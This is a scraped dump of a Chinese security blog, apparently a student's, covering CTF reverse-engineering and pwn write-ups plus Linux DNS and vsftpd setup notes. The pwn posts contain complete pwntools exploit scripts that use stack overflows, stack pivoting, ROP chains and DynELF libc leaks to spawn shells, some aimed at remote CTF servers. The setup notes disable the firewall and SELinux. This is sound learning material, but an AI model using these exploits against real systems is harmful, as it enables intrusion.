上面，右键新建一个函数：整完的样子：然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：然后解密这里： flag = '' key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375] for i in range(51) : flag += chr(int(key[i] / 19683)) print(flag) 然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://chumen77.xyz/tags/RE/"}]},{"title":"linux- DNS搭建记录","slug":"linux_ DNS搭建记录","date":"2020-03-11T06:20:55.000Z","updated":"2020-04-15T14:18:11.128Z","comments":true,"path":"2020/03/11/linux_ DNS搭建记录/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ DNS搭建记录/","excerpt":"","text":"DNS全称： domain name system 域名服务基础DNS作用及类型DNS 系统的作用 ： 正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见） 反向解析：根据 IP 地址查找对应的主机域名（通信行业常用） DNS 系统的工作模式： 递归查询 ：访问必须有一次一回，会返回成功或者失败。 迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。域名结构：全世界有13台根域名服务器。BIND软件服务 服务名：named 端口号：53 主配置文件：/etc/named.conf 保存 DNS 解析记录的数据文件位于：/var/named/ 主配置文件部分参数：listen-on port 53 &#123; 127.0.0.1; &#125;; //要填入自己主机ip listen-on-v6 port 53 &#123; ::1; &#125;; allow-query &#123; any; &#125;;//意思是给任何网段进行解析 分别是: ipv4监听端口和ip地址，默认只有本地的 ipv6的监听端口和ip地址 recursion yes; // 递归还是迭代查询 dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto; 这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。 区域文件部分参数： zone \"baidu.com\" IN &#123; type master; file \"baidu.localhost\"; //本机记录文件名称（可以diy） allow-update &#123; none; &#125;; &#125;; //正向 zone \"131.140.168.192.in-addr.arpa\" IN &#123; type master; file \"baidu.empty\"; allow-update &#123; none; &#125;; &#125;; //反向 //对于其中 file 自定义的名字，要与数据配置文件里面名字相同。 实验搭建过程要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1 服务器主机关闭防火墙、SELinuxvi /etc/selinux/config 把改成 SELINUX = disabled 然后setenforce 0 systemctl stop firewalld.service 关闭防火墙。 配置主配置文件：vi /etc/named.conf ￼注意分号不要忘记，ip填的是本机地址。 配置区域文件vi /etc/named.rfc1912.zones zone \"chumen77.com\" IN &#123; type master; file \"chumen77.localhost\"; allow-update &#123; none; &#125;; &#125;; zone \"10.16.172.in-addr.arpa\" IN &#123; type master; file \"chumen77.loopback\"; allow-update &#123; none; &#125;; &#125;; 其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。 并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。 配置正向反向解析数据文件cp -p /var/named/named.localhost /var/named/chumen77.localhost cp -p /var/named/named.empty /var/named/chumen77.loopback -p 是用来复制文件的权限情况。 来拷贝一下，方便直接修改。 正向解析文件 ： $TTL 1D @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. www IN A 172.16.10.5 ftp IN A 172.16.10.6 mail IN A 172.16.10.8 dns IN A 172.16.10.131 ns1 IN CNAME www * IN A 172.16.10.10 反向解析文件： $TTL 3H @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. 5 PTR www.chumen77.com. 6 PTR ftp.chumen77.com. 8 PTR mail.chumen77.com. 131 PTR dns.chumen77.com. * PTR xxx.chumen77.com. 注意每个网址后面要加个点。 检查和开启named-checkzone 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。 systemctl start named 开启服务，如果出现无法开启，有异常： cat /var/log/messages 用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。 客户机设置网卡设置vi /etc/sysconfig/network-scripts/ifcfg-ens33 修改网卡信息 ： DNS1=192.168.140.131 要在最后加上你dns服务器的ip。注意是 DNS1. 设置好后重启网卡。 service network restart 测速是否成功使用一下 nslookup 正向反向都成功了。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"linux\\_ftp服务搭建踩坑记录","slug":"linux_ftp服务搭建简单记录","date":"2020-03-11T05:46:50.000Z","updated":"2020-06-15T15:06:23.691Z","comments":true,"path":"2020/03/11/linux_ftp服务搭建简单记录/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ftp服务搭建简单记录/","excerpt":"","text":"linux_ftp服务搭建简单记录_前言简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。 两种服务模式 主动模式：FTP服务器主动向客户端发起连接请求。 被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。vsftpd服务程序ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。vsftpd作为更加安全的文件传输的服务程序，允许用户以三种认证模式登录到FTP服务器上。 匿名开放模式：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。 本地用户模式：是通过Linux系统本地的账户密码信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。 虚拟用户模式：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。安装yum -y install vsftpd 配置文件主配置文件路径 ： /etc/vsftpd/vsftpd.conf 常用的配置参数以及作用如下： 参数 作用 listen=[YES|NO] 是否以独立运行的方式监听服务 listen_address=IP地址 设置要监听的IP地址 listen_port=21 设置FTP服务的监听端口 download_enable＝[YES|NO] 是否允许下载文件 userlist_enable=[YES|NO] 设置用户列表为“允许”还是“禁止”操作 userlist_deny=[YES|NO] 设置用户列表为“允许”还是“禁止”操作 max_clients=0 最大客户端连接数，0为不限制 max_per_ip=0 同一IP地址的最大连接数，0为不限制 anonymous_enable=[YES|NO] 是否允许匿名用户访问 anon_upload_enable=[YES|NO] 是否允许匿名用户上传文件 anon_umask=022 匿名用户上传文件的umask值 anon_root=/var/ftp 匿名用户的FTP根目录 anon_mkdir_write_enable=[YES|NO] 是否允许匿名用户创建目录 anon_other_write_enable=[YES|NO] 是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限） anon_max_rate=0 匿名用户的最大传输速率（字节/秒），0为不限制 local_enable=[YES|NO] 是否允许本地用户登录FTP local_umask=022 本地用户上传文件的umask值 local_root=/var/ftp 本地用户的FTP根目录 chroot_local_user=[YES|NO] 是否将用户权限禁锢在FTP目录，以确保安全 local_max_rate=0 本地用户最大传输速率（字节/秒），0为不限制 在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。 开启vsftpd服务service vsftpd start systemctl start vsftpd 踩坑记录0x1 ：因为是实验机，随便折腾，为了实验的成功，需要关闭防火墙 和SELinux服务。 防火墙：CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。firewalld防火墙关闭代码： 关闭防火墙systemctl stop firewalld.service 永久禁止防火墙 systemctl disable firewalld.service 检查防火墙状态 systemctl status firewalld.service 提示：Active: inactive (dead)就表示关闭了。 iptables防火墙关闭代码 ： 查询防火墙状态 : service iptables status 停止防火墙 : service iptables stop 启动防火墙 : service iptables start 重启防火墙 : service iptables restart 永久关闭防火墙 : chkconfig iptables off 永久关闭后启用 : chkconfig iptables on SELinux服务：setsebool -P ftpd_full_access=on单独处理ftpd。 或：关闭SELinux $ vi /etc/selinux/config 将 SELINUX=XXX –&gt;XXX 代表级别改为** SELINUX=disabled**然后重启系统，或者执行命令：setenforce 0。 0x2:发现匿名用户，在连上ftp服务器时候，无法进行写入东西。 550 Permission denied. 然后这个目录是: /var/ftp/pub 这就是把这个pub的属主控制为 控制为ftp即可。 chown ftp pub 这样就可以了。 0x3:在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（ftpusers和user_list）把ftpusers这里面的root去掉即可。 0x4: 在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。 采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式可以指定FTP文件夹。￼￼￼￼￼￼￼","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"安恒抗疫赛","slug":"安恒抗疫赛","date":"2020-02-29T04:12:59.000Z","updated":"2020-03-12T15:11:14.000Z","comments":true,"path":"2020/02/29/安恒抗疫赛/","link":"","permalink":"http://chumen77.xyz/2020/02/29/安恒抗疫赛/","excerpt":"","text":"安恒抗疫赛很简单的比赛，题也不多，记录一下做的2道简单的Re。 re1_pyc拿到的是一个pyc文件。直接拿到网站上反编译一下： #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = '' for i in flag: enc1 += chr(ord(i) - 5) return enc1 def rail(flag): p1 = '' p2 = '' p3 = '' enc2 = '' for i in range(len(flag)): j = i % 3 if j == 0: p1 += flag[i] continue if j == 1: p2 += flag[i] continue p3 += flag[i] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' table2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' table = string.maketrans(table1, table2) return flag.translate(table, '=') while True: flag = raw_input('please input flag to check:') if rep(base64.b64encode(rail(caser(flag)))) == 'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi': print 'Success!you got it!' break continue print 'try a gain' 逻辑挺简单的，直接拿着这个代码改下： #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = '' for i in flag: enc1 += chr(ord(i) + 5) return enc1 def rail(flag): p1 = '' p2 = '' p3 = '' enc2 = '' j = 0 x = 25 for i in range(x): j = i + 13 z = j + 13 p3 += flag[i] + flag[j] if z &gt;= 38 : break p3 += flag[z] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' table2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' table = string.maketrans(table1, table2) return flag.translate(table, '=') key = 'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi' flag = rail(caser(base64.b64decode(rep(key) + '='))) print(flag) maze1一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。 ida分析从这里确定下地图，后面的2就是终点。去内存中取出来地图：去ida继续分析：发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。就是这个，flag就是去md5加密一下出来的字符串。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"记录i春秋新春公益赛的两个题","slug":"记录i春秋新春公益赛的两个题","date":"2020-02-25T08:55:25.000Z","updated":"2020-08-17T08:23:18.427Z","comments":true,"path":"2020/02/25/记录i春秋新春公益赛的两个题/","link":"","permalink":"http://chumen77.xyz/2020/02/25/记录i春秋新春公益赛的两个题/","excerpt":"","text":"记录i春秋新春公益赛的两个题吃鸡神器这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的x64dbg可以调试了。 x64dbg调试一直运行程序等代码跑到0x40开头的段，进入login 的模块。找下字符串：￼在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。换个思路，还是跳转到失败那里，但是在上层函数的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：发现这段是在一个个字符处理lubenwei字符串，还有ret，这样基本就是了。ret以后到：注意此处的汇编语句，并看下寄存器情况： 刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码12345678，十分可疑了。在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过0x004021D3这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。测试以后发现是小写的eax 41D26F00 ：41d26f00,输入密码：Ok,成功了。 borrowstack这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。 查保护和arch[*] '/media/psf/mypwn2/xcgys/borrowstack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; char buf; // [rsp+0h] [rbp-60h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(&amp;s); read(0, &amp;buf, 0x70uLL); puts(\"Done!You can check and use your borrow stack now!\"); read(0, &amp;bank, 0x100uLL); return 0; &#125; 代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。 坑点（学到的新东西）先说下这个程序的情况：bank 的地址 .bss:0000000000601080注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。当调用第二个函数：发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。 解决办法就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。 expfrom pwn import * from LibcSearcher import * import time context.log_level = 'debug' context.arch = 'amd64' io = process('./borrowstack') # io = remote('123.56.85.29',3635) elf = ELF('./borrowstack') # libc = elf.libc leave_addr = 0x0400699 offset = 200 buf_addr = 0x000601080 padding = 0x60 start_addr = 0x0400626 p = '\\x00'* padding + p64(buf_addr+offset) + p64(leave_addr) pop_rsi_rx_ret = 0x400701 io.recvuntil('want\\n') raw_input('-&gt;') io.send(p) io.recvuntil('stack now!\\n') libc_start_main = elf.got['__libc_start_main'] puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x400703 read_got = elf.got['read'] p = flat(['b'*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr]) raw_input('-&gt;') io.sendline(p) puts_add = u64((io.recv(6)).ljust(8,'\\x00')) print(hex(puts_add)) obj = LibcSearcher('puts',puts_add) libc_base = puts_add - obj.dump('puts') print(hex(libc_base)) sleep(0.1) rec = libc_base + 0x4526a system_addr = libc_base + libc_base binsh_addr = libc_base + libc_base print(hex(system_addr)) print(hex(binsh_addr)) io.recvline() io.recvuntil('want\\n') p = '\\x00'* padding + p64(1) + p64(rec) io.send(p) io.interactive() 结论和收获结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"XCTF\\_pwn新手","slug":"XCTF_pwn新手","date":"2020-02-17T12:42:23.000Z","updated":"2020-02-28T09:12:25.000Z","comments":true,"path":"2020/02/17/XCTF_pwn新手/","link":"","permalink":"http://chumen77.xyz/2020/02/17/XCTF_pwn新手/","excerpt":"","text":"XCTF_pwn新手cgpwn2查保护和archArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析漏洞就在这s处，gets可以无限读取，导致栈溢出。 攻击思路 第一个fgets获取时候，读取一个/bin/sh\\x00进去，因为name的地址是固定的。 get函数获取时候，padding + system_plt +name地址即可。 expfrom pwn import * context.log_level = 'debug' # io = process('./cgpwn2') io = remote('111.198.29.45',40540) elf = ELF('./cgpwn2') io.recvuntil('name\\n') raw_input('-&gt;') io.sendline('/bin/sh\\x00') system_plt = elf.symbols['system'] padding = 0x26 + 4 binsh_add = 0x0804A080 payload = padding * 'a' + p32(system_plt) + p32(0x0804A080) + p32(binsh_add) raw_input('-&gt;') io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"利用DynElf模块完成获取libc信息","slug":"利用DynElf模块完成获取libc信息","date":"2020-02-15T08:54:53.000Z","updated":"2020-02-28T07:49:41.000Z","comments":true,"path":"2020/02/15/利用DynElf模块完成获取libc信息/","link":"","permalink":"http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/","excerpt":"","text":"利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释） 基本使用框架：io = remote(ip, port) def leak(addr): payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot; io.send(payload) data = io.recv() #debug用的 print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data #初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject) system_addr = d.lookup(“system”, &apos;libc&apos;)其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols。 且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。 使用条件：不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件： 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内； 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。 以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。 使用write函数来泄露write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。 其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。 万能gadget这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的pop rbx的地址，然后看下栈如何来布置：（其中为什么填入got地址，是因为接下来ret到mov rdx,r13后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）在第一段pop 后ret地址要填入mov rdx,r13的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。 PlaidCTF 2013 ropasaurusrex查保护和archArch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析ssize_t sub_80483F4() { char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u); }函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。 expfrom pwn import * io = process(&apos;./ropasaurusrex&apos;) elf = ELF(&apos;./ropasaurusrex&apos;) buf = 0x8049620 padding = 140 write_add = elf.symbols[&apos;write&apos;] start_addr = 0x08048340 def leak(addr): p = &apos;&apos; p += padding * &apos;a&apos; p += p32(write_add) p += p32(start_addr) p += p32(1) p += p32(addr) p += p32(0x4) io.sendline(p) content = io.recv(4) # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak,elf=elf) system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;) log.info(&quot;system_add = %x&quot;, system_add) log.info(&quot;read_add = %x&quot;, read_add) p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8) io.sendline(p) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()Jarvis_oj_leave4查保护和arch[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析 ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u); }漏洞函数，存在栈溢出。还是跟上题一样的思路。 expfrom pwn import * import time # context.log_level = &apos;debug&apos; context.arch = &apos;i386&apos; # io = process(&apos;./level4&apos;) io = remote(&apos;pwn2.jarvisoj.com&apos;,9880) elf = ELF(&apos;./level4&apos;) __libc_start_main_got = elf.got[&apos;__libc_start_main&apos;] write_plt = elf.symbols[&apos;write&apos;] start_addr = 0x08048350 padding = 140 def leak(addr): payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4) io.sendline(payload) data = io.recv(4) print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data d = DynELF(leak,elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) info(&apos;system_addr = %#x&apos; %system_addr) read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;) info(&apos;read_addr = %#x&apos; %read_addr) binsh_add = 0x804A01C payload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8) io.sendline(payload) sleep(0.1) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()使用puts函数来泄露printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。 针对缺点的改进办法puts输出完后就没有其他输出leak函数模板 def leak(address): count = 0 content = ‘’ payload = xxx p.send(payload) print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出 up = “” while True: c = p.recv(numb=1, timeout=0.1) count += 1 if up == ‘\\n’ and c == “”: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content += content[:-1] +’\\x00’ #删除puts函数输出的末尾回车符 break else: content += c up = c content = content[:4] #取指定字节数 log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’))) return content其中c = p.recv(numb=1, timeout=0.1)由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串”” puts输出完后还有其他输出def leak(address): count = 0 content = &quot;&quot; payload = xxx p.send(payload) print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出 up = &quot;&quot; while True: c = p.recv(1) count += 1 if up == &apos;\\n&apos; and c == &quot;x&quot;: #一定要找到泄漏信息的字符串特征 content = content[:-1] + &quot;x00&quot; break else: content += c up = c content = content[:4] log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;))) return contentLctf_2016_pwn100查保护和arch[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析int sub_40068E() { char v1; // [rsp+0h] [rbp-40h] sub_40063D((__int64)&amp;v1, 200); return puts(&quot;bye~&quot;); } __int64 __fastcall sub_40063D(__int64 a1, signed int a2) { __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); } return result; }主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。 因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。 第二次构造rop链的时候，用read函数读system(/bin/sh)到一个确定的地址，还是会到start处。 第三次构造时候，直接进行调用system函数的rop链即可。 其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。 exp#coding:utf-8 from pwn import * context.arch = &apos;amd64&apos; # context.log_level = &apos;info&apos; io = process(&apos;./pwn100&apos;) elf = ELF(&apos;./pwn100&apos;) # libc = elf.libc padding = 72 puts_plt = elf.plt[&apos;puts&apos;] read_got = elf.got[&apos;read&apos;] start_add = 0x000400550 pop_rdi = 0x400763 def leak(addr): payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)] payload = payload.ljust(200,&apos;b&apos;) io.send(payload) count = 0 up = &apos;&apos; content = &apos;&apos; io.recvuntil(&apos;bye~\\n&apos;) #一定要在puts前释放完输出 while True: c = io.recv(numb=1, timeout=0.1) count += 1 if up == &apos;\\n&apos; and c == &quot;&quot;: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content = content[:-1] +&apos;\\x00&apos; #删除puts函数输出的末尾回车符 break content += c else: up = c content = content[:4] #取指定字节数 log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak, elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) log.info(&apos;system_addr = %#x&apos; %system_addr) binsh_addr = 0x601068 - 8 payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\\x00&apos;*56,start_add]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.recvuntil(&apos;bye~\\n&apos;) io.send(&apos;/bin/sh\\x00&apos;) payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.interactive()其他获取libc的方法虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：http://libcdb.com/https://libc.blukat.me/都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。 